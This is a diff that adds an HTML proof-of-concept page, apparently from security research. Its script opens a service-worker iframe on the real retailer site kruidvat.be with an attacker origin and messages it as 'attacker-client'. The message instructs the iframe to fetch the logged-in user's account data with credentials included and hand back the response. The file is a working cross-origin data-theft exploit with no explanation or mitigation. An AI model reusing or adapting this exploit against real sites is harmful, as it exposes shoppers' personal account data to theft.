@@ -1,1 +1,32 @@
-crazy shit
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <script>
+        let x = window.open("https://ecom-data.kruidvat.be/_/service_worker/63b0/sw_iframe.html?origin=https://poc1337.xyz&1p=1");
+
+        setTimeout(() => {
+            x.postMessage({
+                type: 1,
+                clientId: 'attacker-client',
+                command: {
+                    commandType: 0,
+                    params: {
+                        url: "https://www.kruidvat.be/api/v2/kvb/users/current",
+                        method: 0, //GET
+                        credentials: 'include',
+                        processResponse: true
+                    }
+                }
+            }, "*");
+        }, 3000);
+    </script>
+</body>
+
+</html>
